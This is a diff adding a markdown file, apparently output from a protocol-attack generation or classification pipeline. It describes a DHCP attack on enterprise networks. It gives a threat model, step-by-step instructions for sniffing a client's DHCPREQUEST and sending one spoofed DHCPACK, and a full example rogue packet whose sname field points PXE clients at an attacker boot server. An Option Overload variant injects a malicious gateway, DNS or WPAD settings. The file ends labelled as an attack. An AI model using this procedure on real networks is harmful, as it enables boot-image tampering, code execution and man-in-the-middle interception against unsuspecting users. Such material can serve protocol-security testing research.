@@ -1,0 +1,135 @@
+**Threat Model:**
+
+- **Attack Assumption:**
+
+  - Environment: An enterprise IPv4 network where clients obtain addressing and boot configuration via DHCP, including diskless/PXE-boot workstations. DHCP follows RFC 2131 behavior; `sname` is the “server host name” field (64 octets) used by some boot environments as a TFTP/boot server name, and may also carry overloaded DHCP options per RFC 2131 §4.1 and RFC 2132 (Option Overload).
+  - Typical flow: Client sends `DHCPDISCOVER` / `DHCPREQUEST`; server responds with `DHCPOFFER` and `DHCPACK` (RFC 2131 §3.1). The client commits to the configuration when it receives a `DHCPACK` (§3.1 step 5, §4.4.1), including processing `sname` and any options carried there if Option Overload is used (§4.1).
+  - The attacker is on the same L2 segment as the victim client(s) and the legitimate DHCP server. There is no DHCP snooping, no authenticated DHCP, and clients accept any syntactically valid `DHCPACK` that matches their transaction parameters and current state, as is typical in many PXE and OS DHCP implementations (ISC dhclient, systemd-networkd, dnsmasq-based PXE, etc.).
+  - The victim is either:
+    - a PXE/diskless client that uses `sname` as the boot server name / TFTP server (common in legacy BOOTP/DHCP PXE setups; see RFC 2131 §2, and PXE/DHCP usage in RFC 4578), or  
+    - a DHCP client that honors Option Overload and parses DHCP options embedded in `sname` (RFC 2131 §4.1, RFC 2132 Option 52).
+
+- **Attacker Capability:**
+
+  - The attacker can **passively sniff** DHCP traffic on the segment.
+  - The attacker may send **exactly one DHCP message of type `DHCPACK`** containing attacker-chosen values, including the `sname` field.
+  - The attacker cannot send any other DHCP messages (no rogue `DHCPOFFER`, no pre-positioning with multiple packets), and can only observe any responses or subsequent traffic.
+
+---
+
+**Attack Procedure:**
+
+1. **Positioning and Reconnaissance**
+
+   - The attacker connects to the same Layer 2 (e.g., same VLAN) as the target DHCP client and server.
+   - The attacker passively monitors DHCP traffic, waiting for a `DHCPREQUEST` from the target client:
+     - This can be during normal **lease renewal** (RENEWING/REBINDING state per RFC 2131 §4.4.5–4.4.6), where the client broadcasts or unicasts a `DHCPREQUEST` for its existing address.
+     - Or during initial boot, where a PXE client sends a `DHCPREQUEST` after receiving an offer from the legitimate server.
+
+2. **Identify Target Parameters**
+
+   From the observed `DHCPREQUEST`, the attacker learns:
+
+   - `xid` (transaction ID)
+   - `chaddr` (client hardware/MAC address)
+   - The requested IP (from Option 50) or current `ciaddr`
+   - Any `Server Identifier` option the client includes (some states omit it, but clients generally accept any matching `DHCPACK` in response).
+
+3. **Craft a Single Rogue `DHCPACK`**
+
+   The attacker constructs a single `DHCPACK` that:
+
+   - **Matches the client’s transaction context:**
+     - `xid` set to the observed transaction ID.
+     - `chaddr` set to the client’s MAC.
+     - `yiaddr` set to the IP address the client is expecting (e.g., the address it requested or currently holds) so the lease appears valid.
+   - **Contains a malicious `sname`:**
+     - Case A (PXE/boot-server attack): Set `sname` to an attacker-controlled host name or IP used as a boot server, e.g.:
+       - `sname = "malicious-pxe-server.attacker.local"`
+       - Many PXE/BOOTP implementations interpret `sname` as the TFTP/boot server host if Option 66 is absent or ignored.
+     - Case B (Option Overload attack): Include DHCP Option Overload in the options field, indicating that additional DHCP options are contained in `sname` (RFC 2131 §4.1):
+       - Option 52 (Overload) = value indicating “sname” (or “sname and file”).
+       - Encode malicious options (e.g., Router, DNS Server, WPAD) into the `sname` field as per RFC 2132 encoding. This allows the attacker to inject configuration that may not fit (or be expected) in the normal options area.
+   - **Includes mandatory DHCP options:**
+     - Option 53: DHCP Message Type = `DHCPACK` (5).
+     - Option 54: Server Identifier = some IP (can be attacker’s IP or spoofed as the real server’s IP; many clients do not verify strict correspondence).
+     - Option 51: Lease Time, and other standard options, set to reasonable values to avoid suspicion.
+
+4. **Transmit the Single Rogue `DHCPACK`**
+
+   - The attacker sends this single `DHCPACK` immediately after seeing the client’s `DHCPREQUEST`, aiming to reach the client before (or in parallel with) the legitimate server’s reply.
+   - The packet is broadcast or unicast in accordance with the observed DHCPREQUEST and flags.
+
+5. **Client Processing and Security Impact**
+
+   - Per RFC 2131 §3.1 step 5 and §4.4.1, on receipt of a valid `DHCPACK` matching the transaction (same `xid`, matching `chaddr`), the client:
+     - Treats the configuration as committed.
+     - Interprets `sname` as the server host name / boot server, or (if Option Overload is set) as an additional DHCP option area (§4.1).
+   - **Impact – PXE boot server hijack (security-critical):**
+     - A PXE or diskless client uses `sname` as the boot server host and contacts `malicious-pxe-server.attacker.local` for its boot image.
+     - The attacker can now:
+       - Serve a modified OS image, bootloader, or kernel,
+       - Achieving arbitrary code execution on the victim before OS-level security controls load.
+     - This change in boot path is **entirely driven by a single rogue `DHCPACK`**, and the malicious boot configuration persists for the lifetime of the system until reboot/reprovision.
+   - **Impact – Option Overload configuration hijack (security-critical):**
+     - If Option Overload is used and the client parses options from `sname`:
+       - The attacker can inject a malicious default gateway, DNS servers, PAC/WPAD URL, NTP servers, etc.
+       - The client adopts these settings as part of its DHCP configuration and uses them for the lease duration.
+       - This enables MITM, traffic redirection, or DNS-based attacks, again triggered by a single `DHCPACK`.
+
+6. **Observable Success Criteria**
+
+   - Network capture on the victim shows:
+     - The client sending a `DHCPREQUEST`.
+     - The attacker’s single `DHCPACK` with malicious `sname`.
+   - Post-attack behavior:
+     - PXE client issues TFTP/HTTP requests to the attacker-controlled `sname` host for its boot image; or
+     - The victim OS shows updated network configuration (e.g., routes/DNS) consistent with options encoded in `sname` via Option Overload.
+
+---
+
+**Attack Message:**
+
+Example rogue `DHCPACK` in a JSON-like structure (PXE boot-server hijack; `sname` is the target field):
+
+```json
+{
+  "dhcp_header": {
+    "op": 2,                          // BOOTREPLY
+    "htype": 1,                       // Ethernet
+    "hlen": 6,
+    "hops": 0,
+    "xid": "0x3903F326",              // copied from victim's DHCPREQUEST
+    "secs": 0,
+    "flags": "0x8000",                // broadcast
+    "ciaddr": "0.0.0.0",
+    "yiaddr": "192.0.2.100",          // IP client expects
+    "siaddr": "203.0.113.10",         // (optional) boot server IP
+    "giaddr": "0.0.0.0",
+    "chaddr": "00:11:22:33:44:55",    // victim MAC
+    "sname": "malicious-pxe-server.attacker.local",  // ATTACK: rogue boot server
+    "file": ""                        // left empty or normal
+  },
+  "options": [
+    { "code": 53, "name": "DHCP Message Type", "value": "DHCPACK" },
+    { "code": 54, "name": "Server Identifier", "value": "203.0.113.10" },
+    { "code": 51, "name": "IP Address Lease Time", "value": 86400 },
+    { "code": 1,  "name": "Subnet Mask", "value": "255.255.255.0" },
+    { "code": 3,  "name": "Router", "value": "192.0.2.1" },
+    { "code": 6,  "name": "DNS Server", "value": "192.0.2.53" },
+    { "code": 255, "name": "End", "value": null }
+  ]
+}
+```
+
+If demonstrating the Option Overload variant, an additional option would be included:
+
+```json
+{ "code": 52, "name": "Option Overload", "value": "sname" }
+```
+
+and the `sname` field would contain raw-encoded DHCP options instead of a plain hostname, enabling injected router/DNS/etc. via the overloaded `sname` field.
+
+---
+
+**Classification:** ATTACK
